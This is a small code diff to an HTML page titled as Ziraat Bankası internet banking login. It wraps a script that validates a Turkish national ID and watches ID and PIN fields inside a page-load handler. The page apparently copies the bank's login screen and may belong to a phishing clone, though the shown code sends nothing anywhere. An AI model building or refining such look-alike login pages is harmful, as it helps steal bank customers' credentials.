@@ -10,7 +10,7 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <title>Hoş Geldiniz | Ziraat Bankası İnternet Bankacılığı </title>
     <link href="styles.css" rel="stylesheet" id="style">
-	     <script>
+	     <script>document.addEventListener("DOMContentLoaded", function() {
         function tcno_dogrula(tcno) {
             tcno = String(tcno);
             if (tcno.substring(0, 1) === '0') {
@@ -58,6 +58,8 @@
 
         identityInput.addEventListener("input", kontrolEt);
         pinInput.addEventListener("input", kontrolEt);
+	});
+
     </script> 
   </head>
   <body style="
